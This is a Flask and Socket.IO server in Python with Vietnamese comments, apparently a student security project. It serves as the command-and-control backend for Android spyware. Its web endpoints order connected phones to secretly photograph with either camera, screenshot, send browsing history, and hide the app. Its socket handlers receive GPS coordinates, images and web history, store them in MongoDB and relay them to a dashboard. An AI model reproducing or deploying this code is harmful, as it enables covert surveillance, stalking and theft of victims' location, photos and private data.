from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
from flask_cors import CORS 
import os
import base64
from datetime import datetime, timedelta
import pymongo 

# ----- CẤU HÌNH SERVER -----    
app = Flask(__name__)
app.config['SECRET_KEY'] = 'nhung_anh_chang_sieu_dep_trai'
CORS(app) 
socketio = SocketIO(app, cors_allowed_origins="*")

# Tạo thư mục lưu ảnh
UPLOAD_FOLDER = 'storage/images'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# ----- KẾT NỐI MONGODB -----
try:
    client = pymongo.MongoClient("mongodb://localhost:27017/")
    db = client['DoAnBaoMat']
    col_gps = db['vi_tri_gps']
    col_images = db['hinh_anh']
    col_history = db['lich_su_web']
    print(">>> ĐÃ KẾT NỐI MONGODB THÀNH CÔNG! <<<")
except Exception as e:
    print(f">>> LỖI KẾT NỐI MONGODB: {e}")

# ==========================================
# PHẦN 1: API ĐỂ WEB GỌI LỆNH
# ==========================================

@app.route('/')
def index():
    return "SERVER ĐANG CHẠY NGON LÀNH!"

@app.route('/cmd/<action>')
def command_handler(action):
    print(f">>> NHẬN LỆNH TỪ WEB: {action}")
    
    if action == 'cam-sau':
        socketio.emit('LENH_CHUP_ANH', {'camera': 'back'})
    elif action == 'cam-truoc':
        socketio.emit('LENH_CHUP_ANH', {'camera': 'front'})
    elif action == 'screenshot':
        socketio.emit('LENH_CHUP_MAN_HINH', {})
    elif action == 'history':
        socketio.emit('LENH_LAY_LICH_SU', {})
    elif action == 'hide':
        socketio.emit('LENH_AN_HIEN_APP', {'mode': 'hide'})
    elif action == 'show':
        socketio.emit('LENH_AN_HIEN_APP', {'mode': 'show'})
        
    return jsonify({"status": "success", "message": f"Đã gửi lệnh {action}"})


# ==========================================
# PHẦN 2: XỬ LÝ KẾT NỐI SOCKET
# ==========================================

@socketio.on('connect')
def handle_connect():
    print(f"[+] KẾT NỐI MỚI: {request.sid}")
    emit('server_log', {'msg': 'Kết nối thành công!'})

@socketio.on('disconnect')
def handle_disconnect():
    print(f"[-] NGẮT KẾT NỐI: {request.sid}")


# ==========================================
# PHẦN 3: NHẬN DỮ LIỆU TỪ ANDROID -> BẮN SANG WEB
# ==========================================

# 1. Xử lý GPS
@socketio.on('gui_toa_do')
def nhan_gps(data):
    try:
        device_id = data.get('device_id', 'unknown')
        lat = data.get('lat')
        lng = data.get('long')
        
        print(f"[GPS] {device_id}: {lat}, {lng}")
        
        # Lưu vào DB (+7 tiếng cho giờ VN)
        col_gps.insert_one({
            "device_id": device_id,
            "lat": lat,
            "long": lng,
            "thoi_gian": datetime.now() + timedelta(hours=7)
        })

        # ===> ĐÃ SỬA: Bỏ broadcast=True <===
        socketio.emit('update_gps', data) 
        
    except Exception as e:
        print(f"Lỗi GPS: {e}")


# 2. Xử lý Ảnh
@socketio.on('gui_anh')
def nhan_anh(data):
    device_id = data.get('device_id', 'unknown')
    base64_str = data.get('img') 
    loai_anh = data.get('type', 'photo') 

    print(f"[ẢNH] Đang nhận ({loai_anh}) từ {device_id}...")

    try:
        # Giải mã và lưu file
        img_data = base64.b64decode(base64_str)
        ten_file = f"{loai_anh}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        duong_dan = os.path.join(UPLOAD_FOLDER, ten_file)
        
        with open(duong_dan, 'wb') as f:
            f.write(img_data)
            
        # Lưu DB (+7 tiếng)
        col_images.insert_one({
            "device_id": device_id,
            "file_name": ten_file,
            "duong_dan": duong_dan,
            "thoi_gian": datetime.now() + timedelta(hours=7)
        })
        
        # ===> ĐÃ SỬA: Bỏ broadcast=True <===
        socketio.emit('update_image', {
            'img': base64_str,
            'type': loai_anh,
            'time': (datetime.now() + timedelta(hours=7)).strftime('%H:%M:%S')
        })
        
    except Exception as e:
        print(f" -> Lỗi xử lý ảnh: {e}")


# 3. Xử lý Lịch sử Web
@socketio.on('gui_lich_su_web')
def nhan_lich_su(data):
    print(f"[HISTORY] Nhận dữ liệu web...")
    # Lưu DB (+7 tiếng)
    col_history.insert_one({
        "data": data, 
        "time": datetime.now() + timedelta(hours=7)
    })
    
    # ===> ĐÃ SỬA: Bỏ broadcast=True <===
    socketio.emit('update_history', data)


# ---- CHẠY SERVER -----
if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)